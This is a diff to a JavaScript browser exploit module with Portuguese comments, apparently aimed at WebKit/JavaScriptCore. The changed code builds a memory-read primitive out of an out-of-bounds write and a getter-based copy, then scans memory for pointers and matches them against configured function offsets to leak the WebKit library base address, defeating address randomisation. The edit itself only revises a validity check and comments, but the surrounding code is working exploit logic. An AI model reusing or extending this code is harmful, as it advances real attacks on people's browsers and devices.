@@ -14,7 +14,7 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.24";
+const FNAME_MAIN = "ExploitLogic_v10.24"; // Atualizado para esta correção
 
 const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_24";
 const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
@@ -54,7 +54,7 @@ async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
                     } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                 } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
             } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
-            return "getter_copy_v10_24_done";
+            return "getter_copy_v10_24_done"; // Nome do getter atualizado para v10.24
         }
     };
     oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
@@ -82,7 +82,7 @@ export async function sprayAndInvestigateObjectExposure() {
         const VALIDATION_OFFSET = 0x220;
         const VALIDATION_QWORD = new AdvancedInt64(0x12345678, 0xABCDEF01);
         oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
-        let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET); // Usa a primitiva atualizada
+        let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
         if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
             logS3("  PASSO 1: Primitiva de cópia validada.", "good", FNAME_CURRENT_TEST);
         } else {
@@ -118,20 +118,24 @@ export async function sprayAndInvestigateObjectExposure() {
         for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP) {
             let potential_ptr_qword = await readFromOOBOffsetViaCopy(offset);
 
-            // CORREÇÃO da linha 123:
-            const isPtrZero = isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0 && potential_ptr_qword.high() === 0;
-            const isPtrBadRead = isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0xBADBAD && potential_ptr_qword.high() === 0xDEADDEAD;
+            // CORREÇÃO da linha 123: Substituir isZero()
+            const isPtrNullOrError = !potential_ptr_qword || 
+                                     (isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0 && potential_ptr_qword.high() === 0) ||
+                                     (isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0xBADBAD && potential_ptr_qword.high() === 0xDEADDEAD) ||
+                                     (isAdvancedInt64Object(potential_ptr_qword) && potential_ptr_qword.low() === 0xBAD68BAD && potential_ptr_qword.high() === 0xBAD68BAD);
 
-            if (potential_ptr_qword && !isPtrZero && !isPtrBadRead) {
+
+            if (!isPtrNullOrError) {
+                // Heurística para identificar um ponteiro de código/dados plausível
                 if (potential_ptr_qword.high() > 0x1000 && potential_ptr_qword.high() < 0x7FFF && (potential_ptr_qword.low() & 0x7) === 0) {
-                    // logS3(`  Offset ${toHex(offset)}: QWORD copiado = ${potential_ptr_qword.toString(true)} (Potencial Ponteiro)`, "leak", FNAME_CURRENT_TEST);
                     for (const funcName in functionOffsets) {
                         const funcOffsetStr = functionOffsets[funcName];
                         if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
                         try {
                             const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
                             const potential_base_addr = potential_ptr_qword.sub(funcOffsetAdv);
-                            if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) { // Ajuste heurístico para base
+
+                            if ((potential_base_addr.low() & 0xFFF) === 0 && potential_base_addr.high() > 0x1000 && potential_base_addr.high() < 0x7FFF0000 ) {
                                 logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                                 logS3(`      Ponteiro vazado (de ${toHex(offset)} via cópia): ${potential_ptr_qword.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                                 logS3(`      Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
@@ -140,12 +144,12 @@ export async function sprayAndInvestigateObjectExposure() {
                                 webkitBaseLeaked = potential_base_addr;
                                 break; 
                             }
-                        } catch (e_adv64) { /* Ignora */ }
+                        } catch (e_adv64) { /* Ignora se o offset da função não for um AdvInt64 válido */ }
                     }
                 }
             }
             if (webkitBaseLeaked) break;
-            if (offset > SCAN_START && offset % (SCAN_STEP * 256) === 0) {
+            if (offset > SCAN_START && offset % (SCAN_STEP * 256) === 0) { // Log de progresso
                 logS3(`    Scan em ${toHex(offset)}...`, "info", FNAME_CURRENT_TEST);
                 await PAUSE_S3(1); 
             }
